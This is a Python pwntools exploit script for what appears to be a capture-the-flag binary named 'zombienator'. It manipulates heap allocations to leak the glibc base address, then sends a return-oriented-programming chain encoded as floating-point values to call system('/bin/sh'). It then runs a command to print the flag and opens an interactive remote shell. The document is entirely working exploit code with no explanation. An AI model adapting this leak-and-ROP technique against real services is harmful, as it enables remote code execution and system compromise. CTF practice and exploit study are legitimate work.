from pwn import *
import pdb
from typing import List,Union
from struct import unpack

context.binary = elf = ELF('zombienator')
glibc = ELF('glibc/libc.so.6', checksec=False)

context(terminal=['tmux', 'split-window', '-h'])

gs = '''
init-pwndbg
handle SIGALRM ignore
c
'''

def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create(tier: int, position: int):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"Zombienator's tier: ", str(tier).encode())
    p.sendlineafter(b"Front line (0-4) or Back line (5-9): ", str(position).encode())

def remove(position: int):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"Zombienator's position: ", str(position).encode())

def display():
    p.sendlineafter(b">> ", b'3')
    slots = []
    for i in range(10):
        p.recvuntil(b'Slot [')
        p.recv(4)
        slots.append(p.recvline().strip())

    return slots

def attack(coordinates: List[Union[int, str]]):
    p.sendlineafter(b">> ", b'4')
    p.sendlineafter(b"Number of attacks: ", str(len(coordinates)).encode())

    for coordinate in coordinates:
        p.sendlineafter(b"Enter coordinates: ", str(coordinate).encode())


def main():

    #p = gdb.debug('./zombienator', gdbscript=gs, aslr=False)
    
    for i in range(10):
        create(0x82, i)

    for i in range(10):
        remove(i)

    #for i, data in enumerate(display()):
        #print(i, data)
    
    # pwndbg> p/x 0x7ffff7e19ce0 - 0x7ffff7c00000
    # $1 = 0x219ce0

    glibc.address = u64(display()[7].ljust(8, b'\0')) - 0x219ce0

    if not hex(glibc.address).startswith('0x7') or not hex(glibc.address).endswith('000'):
        return

    p.success(f'Glibc base address: {hex(glibc.address)}')
   
    rop = ROP(glibc)

    payload = [0] * 33

    payload += [
    '.',
    0,
    unpack('d', p64(rop.ret.address))[0],
    unpack('d', p64(rop.rdi.address))[0],
    unpack('d', p64(next(glibc.search(b'/bin/sh'))))[0],
    unpack('d', p64(glibc.sym.system))[0],
    
    ]

    attack(payload)

    pause(1)
    p.sendline('cat flag*>&0')

    p.interactive()


if __name__ == '__main__':
    
    #p = gdb.debug('./zombienator', gdbscript=gs, aslr=False)
    p = get_process()
    main()
